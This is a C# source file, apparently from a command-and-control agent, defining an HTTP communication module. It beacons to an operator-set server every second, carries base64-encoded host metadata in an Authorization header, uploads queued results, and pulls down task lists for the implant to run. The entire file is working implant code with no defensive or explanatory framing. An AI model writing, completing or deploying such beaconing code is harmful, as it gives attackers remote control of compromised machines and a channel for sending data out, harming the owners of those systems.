using System.Text;
using System.Text.Json;
using System.Text.Json.Serialization;

namespace C2.Agent.Models
{
    public class HttpCommModule : CommModule
    {
        public string ConnectAddress { get; set; }
        public int ConnectPort {  get; set; }
        private CancellationTokenSource _tokenSource;
        private HttpClient _httpClient;
        public HttpCommModule(string connectAddress, int connectPort)
        {
            ConnectAddress = connectAddress;
            ConnectPort = connectPort;
            _tokenSource = new CancellationTokenSource();
        }

        public override void Init(AgentMetadata agentMetadata)
        {
            base.Init(agentMetadata);
            _httpClient = new HttpClient();
            _httpClient.BaseAddress = new Uri($"http://{ConnectAddress}:{ConnectPort}");
            _httpClient.DefaultRequestHeaders.Clear();

            string jsonString = JsonSerializer.Serialize(AgentMetadata);
            byte[] jsonBytes = Encoding.UTF8.GetBytes(jsonString);
            string b64String = Convert.ToBase64String(jsonBytes);
            _httpClient.DefaultRequestHeaders.Add("Authorization", $"Bearer {b64String}");
        }

        public override async Task Start()
        {
            while (!_tokenSource.IsCancellationRequested)
            {
                // check too see if we have data to send
                if (!Outbound.IsEmpty)
                {
                    await PostData();
                }
                else
                {
                    await CheckIn();
                }

                await Task.Delay(1000);
            }
        }

        private async Task CheckIn()
        {
            byte[] response = await _httpClient.GetByteArrayAsync("/");
            HandleResponse(response);
        }

        private async Task PostData()
        {
            var outbound = GetOutbound();
            string jsonString = JsonSerializer.Serialize(outbound);
            byte[] jsonBytes = Encoding.UTF8.GetBytes(jsonString);
            string b64String = Convert.ToBase64String(jsonBytes);

            var content = new StringContent(b64String, Encoding.UTF8, "application/json");

            var response = await _httpClient.PostAsync("/", content);
            var responseContent = await response.Content.ReadAsByteArrayAsync();

            HandleResponse(responseContent);
        }

        private void HandleResponse(byte[] response)
        {
            AgentTask[] tasks = JsonSerializer.Deserialize<AgentTask[]>(response);

            if (tasks != null && tasks.Any())
            {
                foreach (AgentTask task in tasks)
                {
                    Inbound.Enqueue(task);
                }
            }
        }

        public override void Stop()
        {
            _tokenSource.Cancel();
        }
    }
}
